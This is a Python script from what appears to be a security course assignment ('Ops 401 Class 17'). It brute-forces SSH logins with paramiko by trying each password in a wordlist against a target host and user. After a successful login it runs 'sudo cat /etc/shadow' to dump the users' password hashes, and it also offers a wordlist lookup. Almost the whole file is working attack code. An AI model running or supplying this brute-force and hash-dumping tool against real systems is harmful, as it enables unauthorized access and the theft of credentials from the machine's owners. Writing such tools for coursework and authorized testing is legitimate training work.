#!/usr/bin/python3

# Script: Ops 401 Class 17 script
# Author: Paul Stroud
# Date of latest revision: 05/09/23
# Purpose: Brute force pt2
# Resources used: google, stackoverflow, github demo, chatgpt

# MAIN REQS:


import sys    # for args and sys.exit() to kill the script
import time   # for time.sleep() timeout

import paramiko

### FUNCTIONS ####

def connect_ssh(host, username, pw, port=22):
    print(f"[{username}@{host}] Trying password '{pw}': ", end="")
    ssushi = paramiko.SSHClient()
    ssushi.set_missing_host_key_policy(paramiko.AutoAddPolicy)
    
    try:
      # Create the SSH connection with info: host, port, username, and password. 
      ssushi.connect(host, port, username, pw)
      # print useful information if connected!
      print("SUCCESS!")
      return ssushi
    
    except paramiko.AuthenticationException:
      print("fail")
      return None

    except KeyboardInterrupt:
      print("\nStopped by user. Exiting...")
      sys.exit() # this is Ctrl + C

   

#### MAIN ####

try:
    ip = sys.argv[1]
    user = sys.argv[2]
    wordlist = sys.argv[3]
except:# Exception as exc:
    #print("exc=", exc)
    print("Invalid arguments.\n" \
          "Please provide 3 arguments for this script:\n" \
          "Format: <ip> <username> <wordlist>\n\n" \
          "Exiting...")
    sys.exit()

#input(f'{user}@{ip} using {wordlist} for lookup')


# if len(sys.argv) > 1:
#   wordlist = sys.argv[1]
# else: 
#   wordlist = input('Enter the wordlist file ("/usr/share/wordlists/rockyou.txt" is default): ')
#   ### if nothing entered, use the default filename
#   wordlist = "/usr/share/wordlists/rockyou.txt" if (wordlist == "") else wordlist 

# menu loop
while True:
    time.sleep(1)
    print("\n>>> Password Iterator v1.0 <<<")
    print("Select the operation to perform:" \
          "\n\t1. Dictionary Iterator" \
          "\n\t2. Password Lookup" \
          "\n\t0. Exit")

    op = -1  # holds user input
    while not (op >= 0 and op <= 2):
      try:
         op = int(input("Enter a menu option (0-2): "))
      except KeyboardInterrupt:   # Ctrl+C
         print()
         sys.exit()
      except: # catch all for anything other than menu options or Ctrl+C
         print("Invalid input. Please try again.")

    if op == 0:
      print("Exiting the script...")
      sys.exit()  # kill the script
    else:
      if op == 1:   # password iterator
        print(f"Parsing {wordlist} as the wordlist file.")
        try:
            file = open(wordlist, "rt")
            for pw in file:   # iterate over each line/word in the wordlist
               ssh = connect_ssh(ip, user, pw.strip())
               if (ssh != None):
                  try:
                      print("\nDUMPING USER PW HASHES FROM /etc/shadow:")
                      ssh_in, ssh_out, ssh_err = ssh.exec_command('sudo cat /etc/shadow | grep -v -e "*" -e "!"')
                      print(ssh_out.read().decode("ASCII"))
                      print("^^^ END OF HASHES ^^^")
                  
                  except Exception as exc:
                      print(f"Error retrieving password hashes. Exception: {exc}")
                  
                  break
                  sys.exit()  # exit script after finding the right password

               time.sleep(1)
        except FileNotFoundError: print(f"File {wordlist} does not exist")

      if op == 2:   # password lookup
        test = input("Input the password to look up: ")
        print(f"Looking for {test} in {wordlist}:")
        i = 0   # line counter
        try:
            file = open(wordlist, "rt")
            for pw in file:
               i += 1
               if (test == pw.strip()):
                 print(f"MATCH FOUND!   Line {i}: {test} - {pw.strip()}")
        except FileNotFoundError: print(f"File {wordlist} does not exist")

# end of script